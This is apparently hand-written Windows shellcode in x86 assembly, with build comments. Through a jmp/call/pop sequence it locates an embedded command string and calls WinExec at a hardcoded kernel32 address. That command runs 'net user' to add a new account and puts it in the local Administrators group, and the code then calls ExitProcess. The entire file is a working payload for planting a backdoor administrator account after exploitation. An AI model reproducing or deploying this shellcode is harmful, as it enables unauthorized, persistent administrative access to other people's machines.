; arwin kernel32.dll ExitProcess
; arwin kernel32.dll WinExec
; asm -f elf adduser.asm; ld -o adduser adduser.o; objdump -d adduser
[SECTION .text]

global _start

_start:

jmp short GetCommand

CommandReturn:
    pop ebx
    xor eax, eax
    push eax
    xor eax, eax
    mov [ebx + 89], al
    push ebx
    mov ebx, 0x77e6fd35
    call ebx

    xor eax, eax
    push eax
    mov ebx, 0x77e798fd
    call ebx

GetCommand:
    call CommandReturn
	db "cmd.exe /c net user USERNAME PASSWORD /ADD && net localgroup Administrators /ADD USERNAMEN"